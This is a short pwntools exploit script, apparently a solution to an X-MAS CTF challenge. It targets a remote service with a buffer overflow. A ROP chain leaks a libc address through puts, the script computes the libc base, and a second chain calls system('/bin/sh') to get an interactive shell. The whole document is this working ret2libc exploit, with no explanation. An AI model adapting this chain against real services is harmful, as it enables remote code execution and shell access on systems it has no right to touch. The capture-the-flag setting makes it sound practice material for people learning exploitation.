from pwn import *

p = remote("challs.xmas.htsp.ro", 12006)
elf = ELF("./chall")
libc = ELF("libc-2.27.so")
rop = ROP(elf)

pad = "A"*(18)
puts = elf.plt["puts"]
libc_start_main = elf.symbols["__libc_start_main"]
pop_rdi = (rop.find_gadget(['pop rdi', 'ret']))[0]
RET = (rop.find_gadget(['ret']))[0]

info("puts@plt => "+hex(puts))
info("__libc_start_main => "+hex(libc_start_main))
info("pop rdi => "+hex(pop_rdi))

rop = pad + p64(pop_rdi) + p64(libc_start_main) + p64(puts) + p64(0x401070)
p.sendlineafter("snowmen?", rop)
p.recvline()
p.recvline()
leaked__libc_start_main = u64(p.recvline().strip().ljust(8, "\x00"))
info("Leaked __libc_start_main@GLIBC => "+hex(leaked__libc_start_main))

libc.address = leaked__libc_start_main - libc.sym["__libc_start_main"]
libc_base = libc.address
info("libc base => "+hex(libc_base))

system = libc.sym["system"]
str_bin_sh = next(libc.search("/bin/sh"))

info("/bin/sh => %s " % hex(str_bin_sh))
info("system => %s " % hex(system))

xpl = pad + p64(RET) + p64(pop_rdi) + p64(str_bin_sh) + p64(system)
p.sendlineafter("snowmen?", xpl)

p.interactive()
